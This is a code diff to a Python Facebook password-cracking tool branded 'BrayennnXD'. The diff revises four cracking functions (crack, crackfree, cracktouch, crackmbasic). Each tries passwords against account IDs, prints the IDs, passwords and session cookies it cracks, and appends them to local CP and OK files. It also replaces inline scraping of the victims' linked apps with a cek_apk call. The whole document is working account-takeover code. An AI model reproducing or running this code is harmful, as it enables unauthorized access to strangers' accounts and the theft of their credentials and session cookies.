@@ -1531,7 +1531,7 @@ def crack(idf,pwv):
 					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
 					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='BrayennnXD-CP')
 					cetak(statuscp1)
-					open('/sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					break
 				elif 'ya' in gabriel:
@@ -1540,50 +1540,31 @@ def crack(idf,pwv):
 					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
 					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='BrayennnXD-CP')
 					cetak(statuscp1)
-					open('/sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					ceker(idf,pw)
 					break
 			elif "c_user" in ses.cookies.get_dict().keys():
-				headapp={"user-agent":"SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]"}
 				if 'no' in taplikasi:
+					ok+=1
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-					open('/sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
 					print('\n')
 					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
-					statusok1 = nel(statusok, style='green')
-					cetak(nel(statusok1, title='OK'))
-					ok+=1
+					statusok1 = nel(statusok, width=90, style='bold green', title='BrayennnXD-OK')
+					cetak(statusok1)
+					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					break
 				elif 'ya' in taplikasi:
+					ok+=1
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-					open('/sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
-					user=idf
-					infoakun = ""
-					session = requests.Session()
-					cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
-					cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
-					infoakun += (f"\n[bold cyan][•] LIST ACTIVE APPLICATIONS :[/bold cyan] \n")
-					apkaktif=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek))
-					nok=1
-					for muncul in apkaktif:
-						infoakun+= (f"[bold cyan][{nok}] {muncul[0]} {muncul[1]}[/bold cyan]\n")
-						nok+=1
-
-					hit=0
-					infoakun += (f"\n[bold yellow][•] LIST EXPIRED APPLICATIONS :[/bold yellow]\n")
-					apkexp=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek2))
-					hit=0
-					for muncul in apkexp:
-						hit+=1
-						infoakun += (f"[bold yellow][{hit}] {muncul[0]} {muncul[1]}[/bold yellow]\n")
 					print('\n')
-					statusok = f'[bold green][•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}[/bold green]\n{infoakun}'
-					statusok1 = nel(statusok, style='green')
-					cetak(nel(statusok1, title='[bold green] OK[/bold green]'))
-					ok+=1
+					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
+					statusok1 = nel(statusok, width=90, style='bold green', title='BrayennnXD-OK')
+					cetak(statusok1)
+					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+					cek_apk(kuki)
 					break
 				
 			else:
@@ -1617,7 +1598,7 @@ def crackfree(idf,pwv):
 					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
 					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='BrayennnXD-CP')
 					cetak(statuscp1)
-					open('/sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					break
 				elif 'ya' in gabriel:
@@ -1631,45 +1612,26 @@ def crackfree(idf,pwv):
 					ceker(idf,pw)
 					break
 			elif "c_user" in ses.cookies.get_dict().keys():
-				headapp={"user-agent":"SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]"}
 				if 'no' in taplikasi:
+					ok+=1
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-					open('/sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
 					print('\n')
 					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
-					statusok1 = nel(statusok, style='green')
-					cetak(nel(statusok1, title='OK'))
-					ok+=1
+					statusok1 = nel(statusok, width=90, style='bold green', title='BrayennnXD-OK')
+					cetak(statusok1)
+					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					break
 				elif 'ya' in taplikasi:
+					ok+=1
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-					open('/sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
-					user=idf
-					infoakun = ""
-					session = requests.Session()
-					cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
-					cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
-					infoakun += (f"\n[bold cyan][•] LIST ACTIVE APPLICATIONS :[/bold cyan] \n")
-					apkaktif=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek))
-					nok=1
-					for muncul in apkaktif:
-						infoakun+= (f"[bold cyan][{nok}] {muncul[0]} {muncul[1]}[/bold cyan]\n")
-						nok+=1
-
-					hit=0
-					infoakun += (f"\n[bold yellow][•] LIST EXPIRED APPLICATIONS :[/bold yellow]\n")
-					apkexp=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek2))
-					hit=0
-					for muncul in apkexp:
-						hit+=1
-						infoakun += (f"[bold yellow][{hit}] {muncul[0]} {muncul[1]}[/bold yellow]\n")
 					print('\n')
-					statusok = f'[bold green][•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}[/bold green]\n{infoakun}'
-					statusok1 = nel(statusok, style='green')
-					cetak(nel(statusok1, title='[bold green]AOREC-XD OK[/bold green]'))
-					ok+=1
+					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
+					statusok1 = nel(statusok, width=90, style='bold green', title='BrayennnXD-OK')
+					cetak(statusok1)
+					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+					cek_apk(kuki)
 					break
 				
 			else:
@@ -1706,7 +1668,7 @@ def cracktouch(idf,pwv):
 					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
 					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='BrayennnXD-CP')
 					cetak(statuscp1)
-					open('/sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					break
 				elif 'ya' in gabriel:
@@ -1715,53 +1677,33 @@ def cracktouch(idf,pwv):
 					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
 					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='BrayennnXD-CP')
 					cetak(statuscp1)
-					open('/sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					ceker(idf,pw)
 					break
 			elif "c_user" in ses.cookies.get_dict().keys():
-				headapp={"user-agent":"SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]"}
 				if 'no' in taplikasi:
+					ok+=1
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-					open('/sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
 					print('\n')
 					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
-					statusok1 = nel(statusok, style='green')
-					cetak(nel(statusok1, title='AOREC-XD OK'))
-					ok+=1
+					statusok1 = nel(statusok, width=90, style='bold green', title='BrayennnXD-OK')
+					cetak(statusok1)
+					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					break
 				elif 'ya' in taplikasi:
+					ok+=1
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-					open('/sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
-					user=idf
-					infoakun = ""
-					session = requests.Session()
-					cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
-					cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
-					infoakun += (f"\n[bold cyan][•] LIST ACTIVE APPLICATIONS :[/bold cyan] \n")
-					apkaktif=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek))
-					nok=1
-					for muncul in apkaktif:
-						infoakun+= (f"[bold cyan][{nok}] {muncul[0]} {muncul[1]}[/bold cyan]\n")
-						nok+=1
-
-					hit=0
-					infoakun += (f"\n[bold yellow][•] LIST EXPIRED APPLICATIONS :[/bold yellow]\n")
-					apkexp=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek2))
-					hit=0
-					for muncul in apkexp:
-						hit+=1
-						infoakun += (f"[bold yellow][{hit}] {muncul[0]} {muncul[1]}[/bold yellow]\n")
 					print('\n')
-					statusok = f'[bold green][•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}[/bold green]\n{infoakun}'
-					statusok1 = nel(statusok, style='green')
-					cetak(nel(statusok1, title='[bold green]AOREC-XD OK[/bold green]'))
-					ok+=1
+					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
+					statusok1 = nel(statusok, width=90, style='bold green', title='BrayennnXD-OK')
+					cetak(statusok1)
+					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+					cek_apk(kuki)
 					break
-
-
+				
 			else:
 				continue
 		except requests.exceptions.ConnectionError:
@@ -1795,7 +1737,7 @@ def crackmbasic(idf,pwv):
 					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
 					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='BrayennnXD-CP')
 					cetak(statuscp1)
-					open('/sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					break
 				elif 'ya' in gabriel:
@@ -1804,51 +1746,33 @@ def crackmbasic(idf,pwv):
 					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
 					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='BrayennnXD-CP')
 					cetak(statuscp1)
-					open('/sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					ceker(idf,pw)
 					break
 			elif "c_user" in ses.cookies.get_dict().keys():
-				headapp={"user-agent":"SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]"}
 				if 'no' in taplikasi:
+					ok+=1
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-					open('/sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
 					print('\n')
 					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
-					statusok1 = nel(statusok, style='green')
-					cetak(nel(statusok1, title='OK'))
-					ok+=1
+					statusok1 = nel(statusok, width=90, style='bold green', title='BrayennnXD-OK')
+					cetak(statusok1)
+					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					break
 				elif 'ya' in taplikasi:
+					ok+=1
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-					open('/sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
-					user=idf
-					infoakun = ""
-					session = requests.Session()
-					cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
-					cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
-					infoakun += (f"\n[bold cyan][•] LIST ACTIVE APPLICATIONS :[/bold cyan] \n")
-					apkaktif=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek))
-					nok=1
-					for muncul in apkaktif:
-						infoakun+= (f"[bold cyan][{nok}] {muncul[0]} {muncul[1]}[/bold cyan]\n")
-						nok+=1
-
-					hit=0
-					infoakun += (f"\n[bold yellow][•] LIST EXPIRED APPLICATIONS :[/bold yellow]\n")
-					apkexp=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek2))
-					hit=0
-					for muncul in apkexp:
-						hit+=1
-						infoakun += (f"[bold yellow][{hit}] {muncul[0]} {muncul[1]}[/bold yellow]\n")
 					print('\n')
-					statusok = f'[bold green][•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}[/bold green]\n{infoakun}'
-					statusok1 = nel(statusok, style='green')
-					cetak(nel(statusok1, title='[bold green]AOREC-XD OK[/bold green]'))
-					ok+=1
+					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
+					statusok1 = nel(statusok, width=90, style='bold green', title='BrayennnXD-OK')
+					cetak(statusok1)
+					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+					cek_apk(kuki)
 					break
+				
 			else:
 				continue
 		except requests.exceptions.ConnectionError:
